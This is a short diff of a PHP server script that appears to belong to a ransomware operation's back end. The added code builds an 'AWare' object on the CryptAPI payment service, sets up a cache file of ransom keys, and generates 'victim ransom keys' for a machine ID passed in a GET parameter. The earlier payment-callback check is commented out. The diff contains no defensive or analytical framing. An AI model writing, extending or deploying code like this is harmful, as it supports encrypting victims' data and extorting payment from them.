@@ -2,12 +2,22 @@
 
 require_once 'inc/bootstrap.php';
 
-if (isset($_GET['victim']))
+$AWare = new AWare(new CryptAPI());
+
+$AWare->DefineJsonCachePaths('temp/cache.json', 'temp/ransom_keys_cache.json');
+
+if (isset($_GET['HWID_PC']))
 {
-    $Aware = new AWare(TempCacheJsonPath);
+    $AWare->GenerateVictimRansomKeys($_GET['HWID_PC']);
 }
 
-if (!CryptAPI\CryptAPI::process_callback($_GET, $Arrays))
-{
-    ExitMessage('Invalid GET Parameters');
-}
+// if (isset($_GET['HWID_PC']))
+// {
+//     $Aware = new AWare('temp/cache.json', 'temp/ransom_keys_cache.json');
+//     $Aware->GenerateVictimRansomKeys($_GET['HWID_PC']);
+// }
+
+// if (!CryptAPI\CryptAPI::process_callback($_GET, $Arrays))
+// {
+//     ExitMessage('Invalid GET Parameters');
+// }
